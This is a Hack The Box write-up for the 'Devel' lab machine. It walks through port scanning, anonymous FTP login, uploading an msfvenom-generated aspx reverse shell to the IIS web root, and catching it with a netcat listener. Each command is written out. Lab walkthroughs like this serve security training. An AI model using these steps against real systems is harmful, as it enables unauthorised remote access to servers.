<H1 style="text-align: center;">Hack The Box </H1>
<H2 style="text-align: center;">Devel write up </H2>
<H2 style="text-align: center;">By Michael ThugBounty Keck </H2>
<p style="text-align: center"><img src="https://github.com/mkeck3672/Hack_The_Box_Write_Ups/blob/main/images/Devel.png"></p>

<H1 style="test-align: left;"> Recon: <H1>
Started the test out by running Rustscan to get the open ports. 
Command: rustscan -a 10.10.10.5
<p style="text-align: center"><img src="https://github.com/mkeck3672/Hack_The_Box_Write_Ups/blob/main/images/devel.jpg"></p>

|Status|IP|Port|
| -----|--|----------- |
| Open | 10.10.10.4 | 21 |
| Open | 10.10.10.4 | 80 |

PORT 21: 
Checked to see if FTP would allow for anonymous login
Command: ftp 10.10.10.5
Found that anonymous login was allowed 
I used the following creds anonymous:anonymous
<p style="text-align: center"><img src="https://github.com/mkeck3672/Hack_The_Box_Write_Ups/blob/main/images/Devel%20(6).jpg"></p>

PORT 80:
In FireFox I navigated to the page using the IP
I found the standard IIS7 page. 
<p style="text-align: center"><img src="https://github.com/mkeck3672/Hack_The_Box_Write_Ups/blob/main/images/Devel%20(7).jpg"></p>

USER SHELL:
Started by testing FTP and adding a test text file.
Command echo 'testing' > test.txt 
<p style="text-align: center"><img src="https://github.com/mkeck3672/Hack_The_Box_Write_Ups/blob/main/images/Devel%20(5).jpg"></p>

while connected to the host via FTP I uploaded the file. 
Command: put test.txt. -> upload successful 
<p style="text-align: center"><img src="https://github.com/mkeck3672/Hack_The_Box_Write_Ups/blob/main/images/Devel%20(8).jpg"></p>
I checked the web browser by going to 10.10.10.5/test.txt and found the file was showing in the browser. 

Once I knew that it was working I crafted a reverse shell using MSFvenom
Command: msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.2 LPORT=4444 -f aspx > reverse.aspx
<p style="text-align: center"><img src="https://github.com/mkeck3672/Hack_The_Box_Write_Ups/blob/main/images/Devel%20(9).jpg"></p>

Again used the put command 
Command put reverse.aspx
<p style="text-align: center"><img src="https://github.com/mkeck3672/Hack_The_Box_Write_Ups/blob/main/images/Devel%20(1).jpg"></p>

I started a netcat listener in a new console tab making sure I use the same port as my payload. 
Command nc -nlvp 4444
Went back to FireFox and changed /test.txt to /reverse.aspx and I was able to get a shell back. 
<p style="text-align: center"><img src="https://github.com/mkeck3672/Hack_The_Box_Write_Ups/blob/main/images/Devel%20(2).jpg"></p>